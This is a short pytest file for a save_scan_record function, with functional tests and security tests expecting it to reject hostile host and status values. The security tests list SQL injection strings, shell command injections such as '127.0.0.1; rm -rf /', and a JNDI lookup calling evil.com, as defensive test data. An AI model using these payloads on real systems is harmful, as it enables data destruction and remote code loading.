import pytest

from src.db import save_scan_record


def test_functional_save_scan_record_returns_expected_dict():
    result = save_scan_record("example.com", 200)
    assert result == {"host": "example.com", "status_code": 200}


def test_functional_save_scan_record_preserves_string_host_and_int_status():
    host = "localhost"
    status_code = 404
    result = save_scan_record(host, status_code)
    assert isinstance(result, dict)
    assert result["host"] == host
    assert result["status_code"] == status_code


@pytest.mark.parametrize(
    "payload",
    [
        "'; DROP TABLE scans; --",
        "127.0.0.1; rm -rf /",
        "${jndi:ldap://evil.com/a}",
    ],
)
def test_security_save_scan_record_rejects_malicious_host_payloads(payload):
    with pytest.raises(Exception):
        save_scan_record(payload, 200)


@pytest.mark.parametrize(
    "payload",
    [
        "200; DROP TABLE users; --",
        "0 OR 1=1",
        "$(touch /tmp/pwned)",
    ],
)
def test_security_save_scan_record_rejects_malicious_status_payloads(payload):
    with pytest.raises(Exception):
        save_scan_record("example.com", payload)